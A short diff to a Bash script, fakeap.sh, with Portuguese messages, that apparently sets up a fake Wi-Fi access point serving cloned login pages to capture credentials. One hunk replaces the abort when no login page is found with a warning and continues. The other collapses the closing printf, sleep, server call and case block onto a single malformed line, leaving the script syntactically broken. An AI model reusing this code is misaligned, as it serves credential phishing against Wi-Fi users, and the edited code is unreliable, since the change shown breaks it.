@@ -28,9 +28,7 @@ extract_login_info() {
 ?>
 EOL
   else
-    echo "Página de login não encontrada em $use_site. Abortando."
-    stop
-    exit 1
+    echo "Aviso: Página de login não encontrada em $use_site. Continuando sem variáveis de login."
   fi
 }
 
@@ -101,13 +99,8 @@ start() {
   sleep 2
   printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Configurando DHCP e DNS...\e[0m\n"
   sleep 2
-  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Para parar: ./fakeap.sh --stop\n"
-  sleep 2
-  server
-}
-
-case "$1" in --stop) stop ;; 
-*)
-start 
-;;
-esac
+  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Para parar: ./fakeap.sh --stop\n" sleep 2 server }case "$1" in --stop) stop ;;
+  *) 
+  start
+  ;; 
+  esac
